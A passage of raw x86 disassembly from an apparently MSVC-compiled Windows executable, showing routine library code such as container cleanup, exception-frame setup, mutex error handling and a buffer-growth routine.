  40166e:	3b c1                	cmp    %ecx,%eax
  401670:	74 0d                	je     0x40167f
  401672:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  401676:	75 5a                	jne    0x4016d2
  401678:	83 c0 08             	add    $0x8,%eax
  40167b:	3b c1                	cmp    %ecx,%eax
  40167d:	75 f3                	jne    0x401672
  40167f:	8b 4e 08             	mov    0x8(%esi),%ecx
  401682:	2b ca                	sub    %edx,%ecx
  401684:	83 e1 f8             	and    $0xfffffff8,%ecx
  401687:	57                   	push   %edi
  401688:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40168e:	72 12                	jb     0x4016a2
  401690:	8b 7a fc             	mov    -0x4(%edx),%edi
  401693:	83 c1 23             	add    $0x23,%ecx
  401696:	2b d7                	sub    %edi,%edx
  401698:	8d 42 fc             	lea    -0x4(%edx),%eax
  40169b:	83 f8 1f             	cmp    $0x1f,%eax
  40169e:	77 23                	ja     0x4016c3
  4016a0:	8b d7                	mov    %edi,%edx
  4016a2:	51                   	push   %ecx
  4016a3:	52                   	push   %edx
  4016a4:	e8 02 8e 00 00       	call   0x40a4ab
  4016a9:	83 c4 08             	add    $0x8,%esp
  4016ac:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4016b2:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  4016b9:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  4016c0:	5f                   	pop    %edi
  4016c1:	5e                   	pop    %esi
  4016c2:	c3                   	ret
  4016c3:	6a 00                	push   $0x0
  4016c5:	6a 00                	push   $0x0
  4016c7:	6a 00                	push   $0x0
  4016c9:	6a 00                	push   $0x0
  4016cb:	6a 00                	push   $0x0
  4016cd:	e8 9d c6 00 00       	call   0x40dd6f
  4016d2:	e8 73 ec 00 00       	call   0x41034a
  4016d7:	cc                   	int3
  4016d8:	cc                   	int3
  4016d9:	cc                   	int3
  4016da:	cc                   	int3
  4016db:	cc                   	int3
  4016dc:	cc                   	int3
  4016dd:	cc                   	int3
  4016de:	cc                   	int3
  4016df:	cc                   	int3
  4016e0:	55                   	push   %ebp
  4016e1:	8b ec                	mov    %esp,%ebp
  4016e3:	6a ff                	push   $0xffffffff
  4016e5:	68 30 db 41 00       	push   $0x41db30
  4016ea:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4016f0:	50                   	push   %eax
  4016f1:	51                   	push   %ecx
  4016f2:	53                   	push   %ebx
  4016f3:	56                   	push   %esi
  4016f4:	57                   	push   %edi
  4016f5:	a1 80 80 42 00       	mov    0x428080,%eax
  4016fa:	33 c5                	xor    %ebp,%eax
  4016fc:	50                   	push   %eax
  4016fd:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401700:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401706:	8b d9                	mov    %ecx,%ebx
  401708:	8d 73 20             	lea    0x20(%ebx),%esi
  40170b:	56                   	push   %esi
  40170c:	e8 f2 82 00 00       	call   0x409a03
  401711:	83 c4 04             	add    $0x4,%esp
  401714:	85 c0                	test   %eax,%eax
  401716:	75 7f                	jne    0x401797
  401718:	8b 46 2c             	mov    0x2c(%esi),%eax
  40171b:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  401720:	74 7c                	je     0x40179e
  401722:	56                   	push   %esi
  401723:	c6 43 78 01          	movb   $0x1,0x78(%ebx)
  401727:	e8 e8 82 00 00       	call   0x409a14
  40172c:	8d 43 50             	lea    0x50(%ebx),%eax
  40172f:	50                   	push   %eax
  401730:	e8 4a 84 00 00       	call   0x409b7f
  401735:	8b 43 04             	mov    0x4(%ebx),%eax
  401738:	83 c4 08             	add    $0x8,%esp
  40173b:	8b 33                	mov    (%ebx),%esi
  40173d:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401740:	3b f0                	cmp    %eax,%esi
  401742:	74 32                	je     0x401776
  401744:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  401748:	74 66                	je     0x4017b0
  40174a:	8b 7e 04             	mov    0x4(%esi),%edi
  40174d:	e8 33 82 00 00       	call   0x409985
  401752:	3b f8                	cmp    %eax,%edi
  401754:	74 41                	je     0x401797
  401756:	6a 00                	push   $0x0
  401758:	ff 76 04             	push   0x4(%esi)
  40175b:	ff 36                	push   (%esi)
  40175d:	e8 29 82 00 00       	call   0x40998b
  401762:	83 c4 0c             	add    $0xc,%esp
  401765:	85 c0                	test   %eax,%eax
  401767:	75 40                	jne    0x4017a9
  401769:	89 06                	mov    %eax,(%esi)
  40176b:	89 46 04             	mov    %eax,0x4(%esi)
  40176e:	83 c6 08             	add    $0x8,%esi
  401771:	3b 75 f0             	cmp    -0x10(%ebp),%esi
  401774:	75 ce                	jne    0x401744
  401776:	8d 4b 0c             	lea    0xc(%ebx),%ecx
  401779:	e8 92 fd ff ff       	call   0x401510
  40177e:	8b cb                	mov    %ebx,%ecx
  401780:	e8 db fe ff ff       	call   0x401660
  401785:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401788:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40178f:	59                   	pop    %ecx
  401790:	5f                   	pop    %edi
  401791:	5e                   	pop    %esi
  401792:	5b                   	pop    %ebx
  401793:	8b e5                	mov    %ebp,%esp
  401795:	5d                   	pop    %ebp
  401796:	c3                   	ret
  401797:	6a 05                	push   $0x5
  401799:	e8 a3 8a 00 00       	call   0x40a241
  40179e:	48                   	dec    %eax
  40179f:	6a 06                	push   $0x6
  4017a1:	89 46 2c             	mov    %eax,0x2c(%esi)
  4017a4:	e8 98 8a 00 00       	call   0x40a241
  4017a9:	6a 02                	push   $0x2
  4017ab:	e8 91 8a 00 00       	call   0x40a241
  4017b0:	6a 01                	push   $0x1
  4017b2:	e8 8a 8a 00 00       	call   0x40a241
  4017b7:	cc                   	int3
  4017b8:	cc                   	int3
  4017b9:	cc                   	int3
  4017ba:	cc                   	int3
  4017bb:	cc                   	int3
  4017bc:	cc                   	int3
  4017bd:	cc                   	int3
  4017be:	cc                   	int3
  4017bf:	cc                   	int3
  4017c0:	8d 41 04             	lea    0x4(%ecx),%eax
  4017c3:	c7 01 00 e3 41 00    	movl   $0x41e300,(%ecx)
  4017c9:	50                   	push   %eax
  4017ca:	e8 27 a0 00 00       	call   0x40b7f6
  4017cf:	59                   	pop    %ecx
  4017d0:	c3                   	ret
  4017d1:	cc                   	int3
  4017d2:	cc                   	int3
  4017d3:	cc                   	int3
  4017d4:	cc                   	int3
  4017d5:	cc                   	int3
  4017d6:	cc                   	int3
  4017d7:	cc                   	int3
  4017d8:	cc                   	int3
  4017d9:	cc                   	int3
  4017da:	cc                   	int3
  4017db:	cc                   	int3
  4017dc:	cc                   	int3
  4017dd:	cc                   	int3
  4017de:	cc                   	int3
  4017df:	cc                   	int3
  4017e0:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  4017e4:	0f 85 60 eb 00 00    	jne    0x41034a
  4017ea:	c3                   	ret
  4017eb:	cc                   	int3
  4017ec:	cc                   	int3
  4017ed:	cc                   	int3
  4017ee:	cc                   	int3
  4017ef:	cc                   	int3
  4017f0:	55                   	push   %ebp
  4017f1:	8b ec                	mov    %esp,%ebp
  4017f3:	6a ff                	push   $0xffffffff
  4017f5:	68 5d db 41 00       	push   $0x41db5d
  4017fa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401800:	50                   	push   %eax
  401801:	83 ec 34             	sub    $0x34,%esp
  401804:	a1 80 80 42 00       	mov    0x428080,%eax
  401809:	33 c5                	xor    %ebp,%eax
  40180b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40180e:	53                   	push   %ebx
  40180f:	56                   	push   %esi
  401810:	57                   	push   %edi
  401811:	50                   	push   %eax
  401812:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401815:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40181b:	8b d9                	mov    %ecx,%ebx
  40181d:	89 5d c0             	mov    %ebx,-0x40(%ebp)
  401820:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  401827:	8b 3b                	mov    (%ebx),%edi
  401829:	83 c7 20             	add    $0x20,%edi
  40182c:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401833:	57                   	push   %edi
  401834:	e8 ca 81 00 00       	call   0x409a03
  401839:	83 c4 04             	add    $0x4,%esp
  40183c:	85 c0                	test   %eax,%eax
  40183e:	0f 85 99 01 00 00    	jne    0x4019dd
  401844:	8b f7                	mov    %edi,%esi
  401846:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%eax,%eax,1)
  40184d:	00 00 00 
  401850:	81 7e 2c ff ff ff 7f 	cmpl   $0x7fffffff,0x2c(%esi)
  401857:	0f 84 72 01 00 00    	je     0x4019cf
  40185d:	8b 33                	mov    (%ebx),%esi
  40185f:	8d 5e 50             	lea    0x50(%esi),%ebx
  401862:	80 7e 78 00          	cmpb   $0x0,0x78(%esi)
  401866:	75 12                	jne    0x40187a
  401868:	83 7e 1c 00          	cmpl   $0x0,0x1c(%esi)
  40186c:	75 0c                	jne    0x40187a
  40186e:	57                   	push   %edi
  40186f:	53                   	push   %ebx
  401870:	e8 32 83 00 00       	call   0x409ba7
  401875:	83 c4 08             	add    $0x8,%esp
  401878:	eb e8                	jmp    0x401862
  40187a:	8b 5d c0             	mov    -0x40(%ebp),%ebx
  40187d:	8b 03                	mov    (%ebx),%eax
  40187f:	80 78 78 00          	cmpb   $0x0,0x78(%eax)
  401883:	74 0a                	je     0x40188f
  401885:	83 78 1c 00          	cmpl   $0x0,0x1c(%eax)
  401889:	0f 84 03 01 00 00    	je     0x401992
  40188f:	8b 48 14             	mov    0x14(%eax),%ecx
  401892:	49                   	dec    %ecx
  401893:	23 48 18             	and    0x18(%eax),%ecx
  401896:	8b 40 10             	mov    0x10(%eax),%eax
  401899:	8b 34 88             	mov    (%eax,%ecx,4),%esi
  40189c:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40189f:	3b c6                	cmp    %esi,%eax
  4018a1:	74 54                	je     0x4018f7
  4018a3:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4018a6:	85 c9                	test   %ecx,%ecx
  4018a8:	74 15                	je     0x4018bf
  4018aa:	8b 11                	mov    (%ecx),%edx
  4018ac:	3b c8                	cmp    %eax,%ecx
  4018ae:	0f 95 c0             	setne  %al
  4018b1:	0f b6 c0             	movzbl %al,%eax
  4018b4:	50                   	push   %eax
  4018b5:	ff 52 10             	call   *0x10(%edx)
  4018b8:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4018bf:	8b 4e 24             	mov    0x24(%esi),%ecx
  4018c2:	85 c9                	test   %ecx,%ecx
  4018c4:	74 31                	je     0x4018f7
  4018c6:	3b ce                	cmp    %esi,%ecx
  4018c8:	75 23                	jne    0x4018ed
  4018ca:	8b 01                	mov    (%ecx),%eax
  4018cc:	8d 55 c8             	lea    -0x38(%ebp),%edx
  4018cf:	52                   	push   %edx
  4018d0:	ff 50 04             	call   *0x4(%eax)
  4018d3:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4018d6:	8b 4e 24             	mov    0x24(%esi),%ecx
  4018d9:	85 c9                	test   %ecx,%ecx
  4018db:	74 1a                	je     0x4018f7
  4018dd:	8b 11                	mov    (%ecx),%edx
  4018df:	3b ce                	cmp    %esi,%ecx
  4018e1:	0f 95 c0             	setne  %al
  4018e4:	0f b6 c0             	movzbl %al,%eax
  4018e7:	50                   	push   %eax
  4018e8:	ff 52 10             	call   *0x10(%edx)
  4018eb:	eb 03                	jmp    0x4018f0
  4018ed:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4018f0:	c7 46 24 00 00 00 00 	movl   $0x0,0x24(%esi)
  4018f7:	8b 33                	mov    (%ebx),%esi
  4018f9:	8b 4e 14             	mov    0x14(%esi),%ecx
  4018fc:	8b 46 10             	mov    0x10(%esi),%eax
  4018ff:	49                   	dec    %ecx
  401900:	23 4e 18             	and    0x18(%esi),%ecx
  401903:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  401906:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  401909:	8b 48 24             	mov    0x24(%eax),%ecx
  40190c:	85 c9                	test   %ecx,%ecx
  40190e:	74 18                	je     0x401928
  401910:	8b 11                	mov    (%ecx),%edx
  401912:	3b c8                	cmp    %eax,%ecx
  401914:	0f 95 c0             	setne  %al
  401917:	0f b6 c0             	movzbl %al,%eax
  40191a:	50                   	push   %eax
  40191b:	ff 52 10             	call   *0x10(%edx)
  40191e:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  401921:	c7 40 24 00 00 00 00 	movl   $0x0,0x24(%eax)
  401928:	83 46 1c ff          	addl   $0xffffffff,0x1c(%esi)
  40192c:	75 09                	jne    0x401937
  40192e:	c7 46 18 00 00 00 00 	movl   $0x0,0x18(%esi)
  401935:	eb 03                	jmp    0x40193a
  401937:	ff 46 18             	incl   0x18(%esi)
  40193a:	57                   	push   %edi
  40193b:	e8 d4 80 00 00       	call   0x409a14
  401940:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401943:	83 c4 04             	add    $0x4,%esp
  401946:	85 c9                	test   %ecx,%ecx
  401948:	0f 84 96 00 00 00    	je     0x4019e4
  40194e:	8b 01                	mov    (%ecx),%eax
  401950:	ff 50 08             	call   *0x8(%eax)
  401953:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401956:	85 c9                	test   %ecx,%ecx
  401958:	74 11                	je     0x40196b
  40195a:	8b 11                	mov    (%ecx),%edx
  40195c:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40195f:	3b c8                	cmp    %eax,%ecx
  401961:	0f 95 c0             	setne  %al
  401964:	0f b6 c0             	movzbl %al,%eax
  401967:	50                   	push   %eax
  401968:	ff 52 10             	call   *0x10(%edx)
  40196b:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  401972:	8b 3b                	mov    (%ebx),%edi
  401974:	83 c7 20             	add    $0x20,%edi
  401977:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40197e:	57                   	push   %edi
  40197f:	8b f7                	mov    %edi,%esi
  401981:	e8 7d 80 00 00       	call   0x409a03
  401986:	83 c4 04             	add    $0x4,%esp
  401989:	85 c0                	test   %eax,%eax
  40198b:	75 50                	jne    0x4019dd
  40198d:	e9 be fe ff ff       	jmp    0x401850
  401992:	57                   	push   %edi
  401993:	e8 7c 80 00 00       	call   0x409a14
  401998:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40199b:	83 c4 04             	add    $0x4,%esp
  40199e:	85 c9                	test   %ecx,%ecx
  4019a0:	74 11                	je     0x4019b3
  4019a2:	8b 11                	mov    (%ecx),%edx
  4019a4:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4019a7:	3b c8                	cmp    %eax,%ecx
  4019a9:	0f 95 c0             	setne  %al
  4019ac:	0f b6 c0             	movzbl %al,%eax
  4019af:	50                   	push   %eax
  4019b0:	ff 52 10             	call   *0x10(%edx)
  4019b3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4019b6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4019bd:	59                   	pop    %ecx
  4019be:	5f                   	pop    %edi
  4019bf:	5e                   	pop    %esi
  4019c0:	5b                   	pop    %ebx
  4019c1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4019c4:	33 cd                	xor    %ebp,%ecx
  4019c6:	e8 fc 8c 00 00       	call   0x40a6c7
  4019cb:	8b e5                	mov    %ebp,%esp
  4019cd:	5d                   	pop    %ebp
  4019ce:	c3                   	ret
  4019cf:	6a 06                	push   $0x6
  4019d1:	c7 46 2c fe ff ff 7f 	movl   $0x7ffffffe,0x2c(%esi)
  4019d8:	e8 64 88 00 00       	call   0x40a241
  4019dd:	6a 05                	push   $0x5
  4019df:	e8 5d 88 00 00       	call   0x40a241
  4019e4:	e8 98 7e 00 00       	call   0x409881
  4019e9:	cc                   	int3
  4019ea:	cc                   	int3
  4019eb:	cc                   	int3
  4019ec:	cc                   	int3
  4019ed:	cc                   	int3
  4019ee:	cc                   	int3
  4019ef:	cc                   	int3
  4019f0:	56                   	push   %esi
  4019f1:	8b f1                	mov    %ecx,%esi
  4019f3:	8d 46 04             	lea    0x4(%esi),%eax
  4019f6:	c7 06 00 e3 41 00    	movl   $0x41e300,(%esi)
  4019fc:	50                   	push   %eax
  4019fd:	e8 f4 9d 00 00       	call   0x40b7f6
  401a02:	83 c4 04             	add    $0x4,%esp
  401a05:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401a0a:	74 0b                	je     0x401a17
  401a0c:	6a 0c                	push   $0xc
  401a0e:	56                   	push   %esi
  401a0f:	e8 97 8a 00 00       	call   0x40a4ab
  401a14:	83 c4 08             	add    $0x8,%esp
  401a17:	8b c6                	mov    %esi,%eax
  401a19:	5e                   	pop    %esi
  401a1a:	c2 04 00             	ret    $0x4
  401a1d:	cc                   	int3
  401a1e:	cc                   	int3
  401a1f:	cc                   	int3
  401a20:	8b 44 24 04          	mov    0x4(%esp),%eax
  401a24:	c7 00 24 ee 41 00    	movl   $0x41ee24,(%eax)
  401a2a:	8b 49 04             	mov    0x4(%ecx),%ecx
  401a2d:	89 48 04             	mov    %ecx,0x4(%eax)
  401a30:	c2 04 00             	ret    $0x4
  401a33:	cc                   	int3
  401a34:	cc                   	int3
  401a35:	cc                   	int3
  401a36:	cc                   	int3
  401a37:	cc                   	int3
  401a38:	cc                   	int3
  401a39:	cc                   	int3
  401a3a:	cc                   	int3
  401a3b:	cc                   	int3
  401a3c:	cc                   	int3
  401a3d:	cc                   	int3
  401a3e:	cc                   	int3
  401a3f:	cc                   	int3
  401a40:	8b 44 24 04          	mov    0x4(%esp),%eax
  401a44:	c7 00 40 ee 41 00    	movl   $0x41ee40,(%eax)
  401a4a:	8b 51 04             	mov    0x4(%ecx),%edx
  401a4d:	8b 49 08             	mov    0x8(%ecx),%ecx
  401a50:	89 50 04             	mov    %edx,0x4(%eax)
  401a53:	89 48 08             	mov    %ecx,0x8(%eax)
  401a56:	c2 04 00             	ret    $0x4
  401a59:	cc                   	int3
  401a5a:	cc                   	int3
  401a5b:	cc                   	int3
  401a5c:	cc                   	int3
  401a5d:	cc                   	int3
  401a5e:	cc                   	int3
  401a5f:	cc                   	int3
  401a60:	8b 44 24 04          	mov    0x4(%esp),%eax
  401a64:	c7 00 08 ee 41 00    	movl   $0x41ee08,(%eax)
  401a6a:	8b 51 04             	mov    0x4(%ecx),%edx
  401a6d:	8b 49 08             	mov    0x8(%ecx),%ecx
  401a70:	89 50 04             	mov    %edx,0x4(%eax)
  401a73:	89 48 08             	mov    %ecx,0x8(%eax)
  401a76:	c2 04 00             	ret    $0x4
  401a79:	cc                   	int3
  401a7a:	cc                   	int3
  401a7b:	cc                   	int3
  401a7c:	cc                   	int3
  401a7d:	cc                   	int3
  401a7e:	cc                   	int3
  401a7f:	cc                   	int3
  401a80:	80 7c 24 04 00       	cmpb   $0x0,0x4(%esp)
  401a85:	74 0b                	je     0x401a92
  401a87:	6a 08                	push   $0x8
  401a89:	51                   	push   %ecx
  401a8a:	e8 1c 8a 00 00       	call   0x40a4ab
  401a8f:	83 c4 08             	add    $0x8,%esp
  401a92:	c2 04 00             	ret    $0x4
  401a95:	cc                   	int3
  401a96:	cc                   	int3
  401a97:	cc                   	int3
  401a98:	cc                   	int3
  401a99:	cc                   	int3
  401a9a:	cc                   	int3
  401a9b:	cc                   	int3
  401a9c:	cc                   	int3
  401a9d:	cc                   	int3
  401a9e:	cc                   	int3
  401a9f:	cc                   	int3
  401aa0:	80 7c 24 04 00       	cmpb   $0x0,0x4(%esp)
  401aa5:	74 0b                	je     0x401ab2
  401aa7:	6a 0c                	push   $0xc
  401aa9:	51                   	push   %ecx
  401aaa:	e8 fc 89 00 00       	call   0x40a4ab
  401aaf:	83 c4 08             	add    $0x8,%esp
  401ab2:	c2 04 00             	ret    $0x4
  401ab5:	cc                   	int3
  401ab6:	cc                   	int3
  401ab7:	cc                   	int3
  401ab8:	cc                   	int3
  401ab9:	cc                   	int3
  401aba:	cc                   	int3
  401abb:	cc                   	int3
  401abc:	cc                   	int3
  401abd:	cc                   	int3
  401abe:	cc                   	int3
  401abf:	cc                   	int3
  401ac0:	56                   	push   %esi
  401ac1:	8b f1                	mov    %ecx,%esi
  401ac3:	ff 76 04             	push   0x4(%esi)
  401ac6:	e8 65 06 00 00       	call   0x402130
  401acb:	ff 76 04             	push   0x4(%esi)
  401ace:	e8 ef 89 00 00       	call   0x40a4c2
  401ad3:	83 c4 08             	add    $0x8,%esp
  401ad6:	5e                   	pop    %esi
  401ad7:	c3                   	ret
  401ad8:	cc                   	int3
  401ad9:	cc                   	int3
  401ada:	cc                   	int3
  401adb:	cc                   	int3
  401adc:	cc                   	int3
  401add:	cc                   	int3
  401ade:	cc                   	int3
  401adf:	cc                   	int3
  401ae0:	56                   	push   %esi
  401ae1:	8b f1                	mov    %ecx,%esi
  401ae3:	ff 76 08             	push   0x8(%esi)
  401ae6:	ff 76 04             	push   0x4(%esi)
  401ae9:	e8 22 02 00 00       	call   0x401d10
  401aee:	ff 76 04             	push   0x4(%esi)
  401af1:	e8 cc 89 00 00       	call   0x40a4c2
  401af6:	83 c4 0c             	add    $0xc,%esp
  401af9:	5e                   	pop    %esi
  401afa:	c3                   	ret
  401afb:	cc                   	int3
  401afc:	cc                   	int3
  401afd:	cc                   	int3
  401afe:	cc                   	int3
  401aff:	cc                   	int3
  401b00:	8d 41 04             	lea    0x4(%ecx),%eax
  401b03:	c3                   	ret
  401b04:	cc                   	int3
  401b05:	cc                   	int3
  401b06:	cc                   	int3
  401b07:	cc                   	int3
  401b08:	cc                   	int3
  401b09:	cc                   	int3
  401b0a:	cc                   	int3
  401b0b:	cc                   	int3
  401b0c:	cc                   	int3
  401b0d:	cc                   	int3
  401b0e:	cc                   	int3
  401b0f:	cc                   	int3
  401b10:	8b 54 24 04          	mov    0x4(%esp),%edx
  401b14:	83 ec 08             	sub    $0x8,%esp
  401b17:	55                   	push   %ebp
  401b18:	8b e9                	mov    %ecx,%ebp
  401b1a:	56                   	push   %esi
  401b1b:	be 01 00 00 00       	mov    $0x1,%esi
  401b20:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401b23:	85 c9                	test   %ecx,%ecx
  401b25:	0f 45 f1             	cmovne %ecx,%esi
  401b28:	8b c6                	mov    %esi,%eax
  401b2a:	2b c1                	sub    %ecx,%eax
  401b2c:	3b c2                	cmp    %edx,%eax
  401b2e:	72 05                	jb     0x401b35
  401b30:	83 fe 08             	cmp    $0x8,%esi
  401b33:	73 13                	jae    0x401b48
  401b35:	b8 66 66 66 06       	mov    $0x6666666,%eax
  401b3a:	2b c6                	sub    %esi,%eax
  401b3c:	3b c6                	cmp    %esi,%eax
  401b3e:	0f 82 41 01 00 00    	jb     0x401c85
  401b44:	03 f6                	add    %esi,%esi
  401b46:	eb e0                	jmp    0x401b28
  401b48:	53                   	push   %ebx
  401b49:	57                   	push   %edi
  401b4a:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401b4d:	89 7c 24 14          	mov    %edi,0x14(%esp)
  401b51:	81 fe ff ff ff 3f    	cmp    $0x3fffffff,%esi
  401b57:	0f 87 3c 01 00 00    	ja     0x401c99
  401b5d:	8d 04 b5 00 00 00 00 	lea    0x0(,%esi,4),%eax
  401b64:	85 c0                	test   %eax,%eax
  401b66:	75 04                	jne    0x401b6c
  401b68:	33 db                	xor    %ebx,%ebx
  401b6a:	eb 39                	jmp    0x401ba5
  401b6c:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401b71:	72 27                	jb     0x401b9a
  401b73:	8d 48 23             	lea    0x23(%eax),%ecx
  401b76:	3b c8                	cmp    %eax,%ecx
  401b78:	0f 86 1b 01 00 00    	jbe    0x401c99
  401b7e:	51                   	push   %ecx
  401b7f:	e8 f7 88 00 00       	call   0x40a47b
  401b84:	83 c4 04             	add    $0x4,%esp
  401b87:	85 c0                	test   %eax,%eax
  401b89:	0f 84 fb 00 00 00    	je     0x401c8a
  401b8f:	8d 58 23             	lea    0x23(%eax),%ebx
  401b92:	83 e3 e0             	and    $0xffffffe0,%ebx
  401b95:	89 43 fc             	mov    %eax,-0x4(%ebx)
  401b98:	eb 0b                	jmp    0x401ba5
  401b9a:	50                   	push   %eax
  401b9b:	e8 db 88 00 00       	call   0x40a47b
  401ba0:	83 c4 04             	add    $0x4,%esp
  401ba3:	8b d8                	mov    %eax,%ebx
  401ba5:	8d 0c bd 00 00 00 00 	lea    0x0(,%edi,4),%ecx
  401bac:	8b d6                	mov    %esi,%edx
  401bae:	d1 ea                	shr    $1,%edx
  401bb0:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  401bb3:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  401bb7:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401bbb:	3b f2                	cmp    %edx,%esi
  401bbd:	77 07                	ja     0x401bc6
  401bbf:	90                   	nop
  401bc0:	03 f6                	add    %esi,%esi
  401bc2:	3b f2                	cmp    %edx,%esi
  401bc4:	76 fa                	jbe    0x401bc0
  401bc6:	8b 55 08             	mov    0x8(%ebp),%edx
  401bc9:	2b f2                	sub    %edx,%esi
  401bcb:	03 4d 04             	add    0x4(%ebp),%ecx
  401bce:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401bd2:	8d 3c 95 00 00 00 00 	lea    0x0(,%edx,4),%edi
  401bd9:	2b f9                	sub    %ecx,%edi
  401bdb:	03 7d 04             	add    0x4(%ebp),%edi
  401bde:	57                   	push   %edi
  401bdf:	51                   	push   %ecx
  401be0:	50                   	push   %eax
  401be1:	e8 6a a0 00 00       	call   0x40bc50
  401be6:	8b 44 24 28          	mov    0x28(%esp),%eax
  401bea:	83 c4 0c             	add    $0xc,%esp
  401bed:	8b 4d 04             	mov    0x4(%ebp),%ecx
  401bf0:	03 c7                	add    %edi,%eax
  401bf2:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401bf6:	39 74 24 14          	cmp    %esi,0x14(%esp)
  401bfa:	77 2a                	ja     0x401c26
  401bfc:	8b 7c 24 10          	mov    0x10(%esp),%edi
  401c00:	57                   	push   %edi
  401c01:	51                   	push   %ecx
  401c02:	50                   	push   %eax
  401c03:	e8 48 a0 00 00       	call   0x40bc50
  401c08:	8b c6                	mov    %esi,%eax
  401c0a:	2b 44 24 20          	sub    0x20(%esp),%eax
  401c0e:	c1 e0 02             	shl    $0x2,%eax
  401c11:	50                   	push   %eax
  401c12:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  401c16:	03 c7                	add    %edi,%eax
  401c18:	6a 00                	push   $0x0
  401c1a:	50                   	push   %eax
  401c1b:	e8 b0 a5 00 00       	call   0x40c1d0
  401c20:	57                   	push   %edi
  401c21:	6a 00                	push   $0x0
  401c23:	53                   	push   %ebx
  401c24:	eb 33                	jmp    0x401c59
  401c26:	8d 3c b5 00 00 00 00 	lea    0x0(,%esi,4),%edi
  401c2d:	57                   	push   %edi
  401c2e:	51                   	push   %ecx
  401c2f:	50                   	push   %eax
  401c30:	e8 1b a0 00 00       	call   0x40bc50
  401c35:	8b 45 04             	mov    0x4(%ebp),%eax
  401c38:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  401c3c:	8d 0c 07             	lea    (%edi,%eax,1),%ecx
  401c3f:	2b d1                	sub    %ecx,%edx
  401c41:	03 d0                	add    %eax,%edx
  401c43:	52                   	push   %edx
  401c44:	51                   	push   %ecx
  401c45:	53                   	push   %ebx
  401c46:	89 54 24 28          	mov    %edx,0x28(%esp)
  401c4a:	e8 01 a0 00 00       	call   0x40bc50
  401c4f:	8b 44 24 28          	mov    0x28(%esp),%eax
  401c53:	57                   	push   %edi
  401c54:	6a 00                	push   $0x0
  401c56:	03 c3                	add    %ebx,%eax
  401c58:	50                   	push   %eax
  401c59:	e8 72 a5 00 00       	call   0x40c1d0
  401c5e:	8b 45 04             	mov    0x4(%ebp),%eax
  401c61:	83 c4 24             	add    $0x24,%esp
  401c64:	85 c0                	test   %eax,%eax
  401c66:	74 0d                	je     0x401c75
  401c68:	ff 75 08             	push   0x8(%ebp)
  401c6b:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  401c6f:	50                   	push   %eax
  401c70:	e8 7b 0f 00 00       	call   0x402bf0
  401c75:	01 75 08             	add    %esi,0x8(%ebp)
  401c78:	5f                   	pop    %edi
  401c79:	89 5d 04             	mov    %ebx,0x4(%ebp)
  401c7c:	5b                   	pop    %ebx
  401c7d:	5e                   	pop    %esi
  401c7e:	5d                   	pop    %ebp
  401c7f:	83 c4 08             	add    $0x8,%esp
  401c82:	c2 04 00             	ret    $0x4
  401c85:	e8 66 00 00 00       	call   0x401cf0
  401c8a:	6a 00                	push   $0x0
  401c8c:	6a 00                	push   $0x0
  401c8e:	6a 00                	push   $0x0
  401c90:	6a 00                	push   $0x0
  401c92:	6a 00                	push   $0x0
  401c94:	e8 d6 c0 00 00       	call   0x40dd6f
  401c99:	e8 32 00 00 00       	call   0x401cd0
  401c9e:	cc                   	int3
  401c9f:	cc                   	int3
  401ca0:	b8 18 8a 42 00       	mov    $0x428a18,%eax
  401ca5:	c3                   	ret
  401ca6:	cc                   	int3
  401ca7:	cc                   	int3
  401ca8:	cc                   	int3
  401ca9:	cc                   	int3
  401caa:	cc                   	int3
  401cab:	cc                   	int3
  401cac:	cc                   	int3
  401cad:	cc                   	int3
  401cae:	cc                   	int3
  401caf:	cc                   	int3
  401cb0:	b8 e0 89 42 00       	mov    $0x4289e0,%eax
  401cb5:	c3                   	ret
  401cb6:	cc                   	int3
